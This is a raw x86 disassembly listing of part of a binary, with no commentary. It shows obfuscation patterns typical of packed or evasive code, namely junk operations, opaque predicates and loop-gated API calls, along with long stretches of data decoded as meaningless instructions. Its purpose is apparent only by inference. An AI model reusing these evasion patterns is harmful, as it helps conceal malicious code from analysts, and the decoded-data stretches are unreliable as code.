  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	sub    ebx,DWORD PTR [edx-0x33d409fc]
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x4f7e7e7c
  407c57:	jmp    0x407c64
  407c59:	mov    BYTE PTR [esi-0x34],dh
  407c5c:	sbb    bh,ah
  407c5e:	or     DWORD PTR es:0x1062f1be,esi
  407c65:	add    eax,0x38a51765
  407c6a:	out    dx,eax
  407c6b:	mov    dh,0xae
  407c6d:	cmp    DWORD PTR [eax-0x48e2bda7],0x5d0e1be1
  407c77:	fwait
  407c78:	sub    DWORD PTR [edx],ebp
  407c7a:	bound  esp,QWORD PTR [ecx+0x5c]
  407c7d:	or     cl,0x38
  407c80:	hlt    
  407c81:	fsub   QWORD PTR [esi+0x4b5e7882]
  407c87:	cmp    BYTE PTR [ecx],dh
  407c89:	scas   al,BYTE PTR es:[edi]
  407c8a:	push   edi
  407c8b:	les    ebx,FWORD PTR [ecx]
  407c8d:	xor    ah,ah
  407c8f:	adc    dh,bl
  407c91:	jg     0x407c4d
  407c93:	lock xchg ecx,eax
  407c95:	mov    eax,0xd00777dd
  407c9a:	push   ecx
  407c9b:	mov    cl,0x63
  407c9d:	add    ebx,DWORD PTR [edi]
  407c9f:	mov    edx,0x1103a652
  407ca4:	or     dl,ah
  407ca6:	mov    al,0x55
  407ca8:	inc    ebp
  407ca9:	cmp    BYTE PTR [edi-0x3dfbed8e],ch
  407caf:	xchg   esp,eax
  407cb0:	iret   
  407cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb2:	inc    edi
  407cb3:	shl    BYTE PTR [ecx],1
  407cb5:	lea    esp,[ebx]
  407cb7:	std    
  407cb8:	pop    esi
  407cb9:	mov    al,BYTE PTR [esi+0x5500857a]
  407cbf:	dec    ecx
  407cc1:	nop
  407cc2:	ror    BYTE PTR [edi+0x23559e3],0x63
  407cc9:	(bad)  
  407ccb:	aam    0xd2
  407ccd:	icebp  
  407cce:	fs nop
  407cd0:	pop    ds
  407cd1:	cmp    dh,BYTE PTR [esi]
  407cd3:	pop    ebx
  407cd4:	(bad)  
  407cd5:	call   0x583ab470
  407cda:	jmp    0x407d49
  407cdc:	in     al,dx
  407cdd:	mov    al,ds:0x401710f6
  407ce2:	cli    
  407ce3:	push   edi
  407ce4:	adc    BYTE PTR [ebp+0x50],bl
  407ce7:	cwde   
  407ce8:	inc    eax
  407ce9:	pop    esi
  407cea:	push   ebx
  407ceb:	leave  
  407cec:	out    dx,eax
  407ced:	out    dx,eax
  407cee:	mov    BYTE PTR [edi+0xc],bl
  407cf1:	pop    ds
  407cf2:	in     al,dx
  407cf3:	arpl   bx,cx
  407cf5:	icebp  
  407cf6:	sti    
  407cf7:	outs   dx,BYTE PTR ds:[esi]
  407cf8:	sbb    al,0x46
  407cfa:	inc    edi
  407cfb:	shr    BYTE PTR [ecx-0x145a96de],cl
  407d01:	dec    ebx
  407d02:	int3   
  407d03:	push   esi
  407d04:	mov    ebp,0x62749222
  407d09:	test   eax,0xa4a18131
  407d0e:	mov    ebx,0x1e79e5ef
  407d13:	mov    eax,ds:0xefd54582
  407d18:	fist   WORD PTR ss:[ecx]
  407d1b:	data16 stos BYTE PTR es:[edi],al
  407d1d:	cmp    edx,eax
  407d1f:	sbb    esp,DWORD PTR [ecx+0x52d5de13]
  407d25:	xchg   edx,eax
  407d26:	sahf   
  407d27:	aas    
  407d28:	jno    0x407ce4
  407d2a:	mov    BYTE PTR [esi+esi*1+0x5042b80e],cl
  407d31:	adc    ebx,DWORD PTR [ebp+eiz*1-0x16feed15]
  407d38:	xlat   BYTE PTR ds:[ebx]
  407d39:	cld    
  407d3a:	aaa    
  407d3b:	sub    al,0xc2
  407d3d:	daa    
  407d3e:	and    BYTE PTR [ebp-0x3bd2bad6],0x53
  407d45:	cmp    esi,ecx
  407d47:	retf   
  407d48:	jle    0x407d44
  407d4a:	ss lahf 
  407d4c:	or     DWORD PTR [edi],esp
  407d4e:	mov    WORD PTR [edi+0x3ca26427],ss
  407d54:	mov    ebp,DWORD PTR [edi]
  407d56:	lods   eax,DWORD PTR ds:[esi]
  407d57:	loope  0x407d2b
  407d59:	sti    
  407d5a:	lods   al,BYTE PTR ds:[esi]
  407d5b:	out    0xa3,eax
  407d5d:	(bad)  
  407d5e:	cdq    
  407d5f:	(bad)  
  407d60:	inc    DWORD PTR [esi-0x1e]
  407d63:	inc    ebp
  407d64:	push   ebx
  407d65:	push   cs
  407d66:	leave  
  407d67:	jmp    0x407d6c
  407d69:	mov    bh,BYTE PTR [ebp-0x4bddebab]
  407d6f:	adc    al,0xa6
  407d71:	out    0x65,eax
  407d73:	fs pushf 
  407d75:	ret    
  407d76:	into   
  407d77:	das    
  407d78:	outs   dx,BYTE PTR ds:[esi]
  407d79:	lods   eax,DWORD PTR ds:[esi]
  407d7a:	mov    ss,eax
  407d7c:	jp     0x407d0b
  407d7e:	mov    edi,0xaa27ed4f
  407d83:	pop    esi
  407d84:	jne    0x407d7e
  407d86:	cmp    BYTE PTR [eax-0x61],0x68
  407d8a:	cs int 0x74
  407d8d:	xchg   ebx,eax
  407d8e:	and    al,0xab
  407d90:	dec    ecx
  407d91:	out    0x5c,al
  407d93:	test   al,0x24
  407d95:	xor    bh,BYTE PTR [edx]
  407d97:	popa   
  407d98:	mov    ecx,0xbcd46d36
  407d9d:	ins    DWORD PTR es:[edi],dx
  407d9e:	nop
  407d9f:	dec    esp
  407da0:	xchg   ebp,eax
  407da1:	(bad)  
  407da2:	and    BYTE PTR [ebx],dh
  407da4:	repz mov ebx,0xadf65058
  407daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dab:	xchg   ecx,eax
  407dac:	aad    0x5f
  407dae:	or     esp,DWORD PTR [ebx]
  407db0:	dec    esp
  407db1:	mov    ebp,eax
  407db3:	popf   
  407db4:	shr    DWORD PTR [esi-0x4e],0x9
  407db8:	dec    esi
  407db9:	clc    
  407dba:	stos   DWORD PTR es:[edi],eax
  407dbb:	test   esi,0x3750a85f
  407dc1:	inc    ebp
  407dc2:	cdq    
  407dc3:	mov    ch,0x8e
  407dc5:	jle    0x407dcc
  407dc7:	mov    al,0x2b
  407dc9:	mov    al,0x7f
  407dcb:	mov    edi,0x9be2d0dc
  407dd0:	jge    0x407e39
  407dd2:	cmp    DWORD PTR [esi+eax*4-0x3360b887],esp
  407dd9:	mov    edx,0x48afa30c
  407dde:	jp     0x407df4
  407de0:	lods   eax,DWORD PTR ds:[esi]
  407de1:	lea    esp,[esi]
  407de3:	ud0    esi,DWORD PTR [ebp+0x8]
  407de7:	fidiv  WORD PTR [ebp+0x7e]
  407dea:	dec    ecx
  407deb:	mov    dl,0xa8
  407ded:	cmp    DWORD PTR [eax],0x79345523
  407df3:	add    al,0x6e
  407df5:	mov    bl,0xf9
  407df7:	(bad)  
  407df8:	jb     0x407e76
  407dfa:	int    0xf8
  407dfc:	jmp    0x8b18:0x68cf5423
  407e03:	push   es
  407e04:	repz faddp st(7),st
  407e07:	sub    edi,DWORD PTR [esi+0x648a0529]
  407e0d:	xor    al,0xfb
  407e0f:	cmp    bl,bl
  407e11:	pop    ebx
  407e12:	mov    eax,0xf5cf60ef
  407e17:	retf   0xa142
  407e1a:	push   ss
  407e1b:	aas    
  407e1c:	sub    esp,DWORD PTR [ecx]
  407e1e:	mov    al,ds:0xbfcf8dfe
  407e23:	inc    edi
  407e24:	push   cs
  407e25:	inc    edi
  407e26:	ds ja  0x407e49
  407e29:	sbb    bh,BYTE PTR [eax-0x380df725]
  407e2f:	inc    ecx
  407e30:	sbb    al,0xfe
  407e32:	mov    ecx,0x22d4f7c7
  407e37:	mov    eax,ds:0xaff4d11c
  407e3c:	inc    edi
  407e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e3e:	xchg   ecx,eax
  407e3f:	fist   DWORD PTR [eax]
  407e41:	push   es
  407e42:	mov    ?,WORD PTR [edi-0xc9f4158]
  407e48:	mov    al,0x9d
  407e4a:	cmp    edi,DWORD PTR [ebx]
  407e4c:	mov    WORD PTR [edi-0x69f78a75],ss
  407e52:	or     ch,BYTE PTR [ebx+ebx*2+0x1b69a6f6]
  407e59:	scas   eax,DWORD PTR es:[edi]
  407e5a:	ins    BYTE PTR es:[edi],dx
  407e5b:	adc    bh,al
  407e5d:	push   esi
  407e5e:	lods   eax,DWORD PTR ds:[esi]
  407e5f:	jns    0x407def
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xd432a90d
  408191:	(bad)  
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	sub    dh,ah
  40819c:	addr16 pop esi
  40819e:	mov    ch,0x55
  4081a0:	mov    esi,DWORD PTR ds:0xe34b621d
  4081a6:	(bad)  
  4081a7:	sbb    ah,BYTE PTR [ecx+0x52]
  4081aa:	push   0xffffffbe
  4081ac:	and    BYTE PTR [edx-0x3f4c1cc3],bh
  4081b2:	mov    eax,edi
  4081b4:	sbb    edi,edi
  4081b6:	sub    bl,BYTE PTR [esi]
  4081b8:	xor    al,0x3
  4081ba:	(bad)  
  4081bb:	jns    0x4081fd
  4081bd:	add    DWORD PTR [edx+0x65],edi
  4081c0:	xchg   edx,eax
  4081c1:	add    DWORD PTR [eax+ebx*1],0x28
  4081c5:	int3   
  4081c6:	(bad)  
  4081c7:	loopne 0x408173
  4081c9:	fimul  DWORD PTR [esi+edi*1]
  4081cc:	in     eax,dx
  4081cd:	and    al,0xc1
  4081cf:	out    0xa5,al
  4081d1:	js     0x4081e5
  4081d3:	sahf   
  4081d4:	push   ss
  4081d5:	inc    edi
  4081d6:	imul   edi,DWORD PTR [ecx+ebp*4+0x156c13e2],0xfffffff4
  4081de:	dec    ebp
  4081df:	out    0x91,eax
  4081e1:	xlat   BYTE PTR ds:[ebx]
  4081e2:	sbb    eax,0xb7ec26f
  4081e7:	ret    0xb4ef
  4081ea:	xor    dl,dh
  4081ec:	fnsave [edx]
  4081ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ef:	jg     0x4081f0
  4081f1:	aaa    
  4081f2:	sar    BYTE PTR [ebx],1
  4081f4:	mov    esp,ecx
  4081f6:	call   0x715b:0x8b24eb9e
  4081fd:	daa    
  4081fe:	dec    ebp
  4081ff:	xchg   esi,eax
  408200:	mov    bl,0xf2
  408202:	sub    DWORD PTR [esi],ebx
  408204:	push   ds
  408205:	mov    ebp,0x5e8c16b9
  40820a:	pop    ebp
  40820b:	jmp    0x4081d4
  40820d:	dec    ecx
  40820e:	sbb    al,0xdc
  408210:	mov    ch,0x3a
  408212:	mov    ch,0x8c
  408214:	ins    BYTE PTR es:[edi],dx
  408215:	popf   
  408216:	fxam   
  408218:	push   eax
  408219:	hlt    
  40821a:	jge    0x40828e
  40821c:	rol    DWORD PTR gs:[edx-0x7be6ef45],1
  408223:	ja     0x408225
  408225:	push   es
  408226:	mov    al,ds:0xdbe02ed9
  40822b:	and    esi,esp
  40822d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40822e:	lock adc al,0x98
  408231:	add    BYTE PTR [edi+0x8],bh
  408234:	mov    eax,0xfda14133
  408239:	dec    edx
  40823a:	mov    ch,0xe6
  40823c:	push   edx
  40823d:	and    DWORD PTR [ebp-0x50],ebx
  408240:	inc    edx
  408241:	outs   dx,DWORD PTR ds:[esi]
  408242:	pop    ss
  408243:	mov    ecx,DWORD PTR [edi-0x1]
  408246:	jns    0x40824b
  408248:	test   BYTE PTR [esi+0xa],bl
  40824b:	jne    0x40829a
  40824d:	fld    TBYTE PTR [edi+0x65a6dc21]
  408253:	adc    ebp,DWORD PTR [esi]
  408255:	mov    dl,0x54
  408257:	and    al,0xa3
  408259:	inc    edx
  40825a:	pop    edx
  40825b:	inc    ecx
  40825c:	cld    
  40825d:	xchg   esi,eax
  40825e:	pop    es
  40825f:	pop    ss
  408260:	mov    bl,0x5
  408262:	mov    ?,WORD PTR [ebp+0x5a]
  408265:	loope  0x408272
  408267:	btc    DWORD PTR [ecx-0x39858950],ebx
  40826e:	or     ebx,DWORD PTR [ebp+0xa72e8]
  408274:	out    0xe9,al
  408276:	je     0x408246
  408278:	ficomp WORD PTR [esi+0x4642fa9]
  40827e:	test   eax,0x4025ccc1
  408283:	cmpxchg DWORD PTR [edx-0x6d73af89],edx
  40828a:	dec    edi
  40828b:	mov    edx,0x32d14dae
  408290:	adc    al,0x1b
  408292:	daa    
  408293:	inc    esp
  408294:	nop
  408295:	jb     0x4082a8
  408297:	dec    ebx
  408298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408299:	mov    cl,0xb8
  40829b:	inc    eax
  40829c:	xor    eax,0xf68e9a0b
  4082a1:	add    ah,BYTE PTR [eax+0x78]
  4082a4:	dec    ebp
  4082a5:	lock daa 
  4082a7:	add    al,0x1
  4082a9:	push   es
  4082aa:	adc    DWORD PTR [ebx+eiz*4+0x5195bf14],eax
  4082b1:	fs sbb eax,0x5376e1b
  4082b7:	jge    0x4082c7
  4082b9:	or     DWORD PTR [eax+0x581ab687],ebp
  4082bf:	or     eax,0xa80b8ba
  4082c4:	pusha  
  4082c5:	mov    cl,0x5
  4082c7:	fimul  WORD PTR [ecx-0x73a27ab4]
  4082cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ce:	in     eax,0x8d
  4082d0:	in     al,dx
  4082d1:	clc    
  4082d2:	xchg   BYTE PTR [edi+0x4c],bh
  4082d5:	ss inc esi
  4082d7:	mov    esi,0x5f31e72e
  4082dc:	jecxz  0x408357
  4082de:	mov    bh,0x7b
  4082e0:	mov    al,0x95
  4082e2:	mov    gs,WORD PTR [eax]
  4082e4:	pop    eax
  4082e5:	shl    eax,1
  4082e7:	ss jmp 0xb360:0xfcb3a6e6
  4082ef:	aam    0xc3
  4082f1:	mov    esi,0xf4c5134
  4082f6:	fistp  WORD PTR [ecx+0x5ac701c4]
  4082fc:	mov    dl,0x39
  4082fe:	add    BYTE PTR [eax+edx*8-0x5b2db53e],dl
  408305:	mov    edx,0xa89632b0
  40830a:	push   edx
  40830b:	mov    edi,0xeaca0145
  408310:	arpl   WORD PTR [ecx-0x2b],bp
  408313:	push   esi
  408314:	int3   
  408315:	dec    esi
  408316:	cmp    BYTE PTR [edi],cl
  408318:	fwait
  408319:	test   al,0x38
  40831b:	fsub   QWORD PTR ds:[edx-0x6c85f2d]
  408322:	inc    edi
  408323:	cmp    DWORD PTR [edi+0x7a],esp
  408326:	(bad)  [ecx]
  408328:	or     BYTE PTR [esi-0x1e],dh
  40832b:	sbb    DWORD PTR [ebp-0x5bb945d8],edx
  408331:	inc    ecx
  408332:	jb     0x408325
  408334:	xor    BYTE PTR ds:0x4386c7ed,cl
  40833a:	push   esi
  40833b:	push   eax
  40833c:	cdq    
  40833d:	pushf  
  40833e:	sub    BYTE PTR ds:0x7f9c34c3,ah
  408344:	or     dh,BYTE PTR [eax+0x7814c0fa]
  40834a:	retf   
  40834b:	mov    eax,ds:0xac156b28
  408350:	push   ebx
  408351:	pop    ds
  408352:	and    ch,BYTE PTR [edx-0x6e1a385a]
  408358:	jp     0x4082e3
  40835a:	stos   BYTE PTR es:[edi],al
  40835b:	jl     0x408317
  40835d:	test   al,0xcf
  40835f:	sub    al,0x58
  408361:	nop
  408362:	inc    eax
  408363:	jne    0x408397
  408365:	pop    ss
  408366:	mov    ch,0x57
  408368:	cwde   
  408369:	sti    
  40836a:	sbb    eax,0x57e9671
  40836f:	push   0x85e46935
  408374:	(bad)  
  408375:	pushf  
  408376:	int3   
  408377:	xchg   ecx,eax
  408378:	cs jb  0x408391
  40837b:	xchg   ebx,eax
  40837c:	pop    ebx
  40837d:	les    ebx,FWORD PTR [eax-0x67]
  408380:	xchg   ebx,eax
  408381:	stos   BYTE PTR es:[edi],al
  408382:	loop   0x4083d7
  408384:	and    DWORD PTR [ebp-0x51877006],ecx
  40838a:	and    bh,BYTE PTR [edx+eax*2+0x6]
  40838e:	dec    esi
  40838f:	push   ecx
  408390:	xchg   esp,eax
  408391:	iret   
  408392:	xchg   ebx,ecx
  408394:	shl    DWORD PTR ss:[edi],1
  408397:	test   bl,bl
  408399:	fs popf 
  40839b:	loopne 0x408342
  40839d:	mov    dl,0x29
  40839f:	cmp    al,al
  4083a1:	popf   
  4083a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a3:	sbb    al,0x8a
  4083a5:	scas   al,BYTE PTR es:[edi]
  4083a6:	lods   eax,DWORD PTR ds:[esi]
  4083a7:	int3   
  4083a8:	and    ch,BYTE PTR [ebp-0x72]
  4083ab:	or     al,0xbc
  4083ad:	and    bh,0xc
  4083b0:	cmp    BYTE PTR [esi-0x7d],0x39
  4083b4:	loope  0x408342
  4083b6:	bound  eax,QWORD PTR [edi]
  4083b8:	cmp    DWORD PTR [eax-0xb],ecx
  4083bb:	outs   dx,BYTE PTR ds:[esi]
  4083bc:	scas   al,BYTE PTR es:[edi]
  4083bd:	pop    edx
  4083be:	jge    0x4083a2
  4083c0:	je     0x4083b7
  4083c2:	jle    0x408395
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	(bad)  
  408465:	popf   
  408466:	arpl   WORD PTR [ebx+0x7e7ec8e4],cx
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	cmp    al,0x6f
  408472:	test   DWORD PTR [ebp-0x738a09fd],edi
  408478:	add    dh,BYTE PTR [edi-0x5ce3155e]
  40847e:	and    ecx,DWORD PTR [ecx-0x265cf9d4]
  408484:	data16 fistp DWORD PTR ss:[ebx+0x16118720]
  40848c:	jg     0x4084f1
  40848e:	scas   eax,DWORD PTR es:[edi]
  40848f:	adc    edi,edi
  408491:	test   DWORD PTR [edi+ebp*2+0x752fcded],edx
  408498:	ficomp WORD PTR [ecx-0x23]
  40849b:	lahf   
  40849c:	mov    ebp,0xf05e9517
  4084a1:	sbb    al,0xa9
  4084a3:	jg     0x4084ad
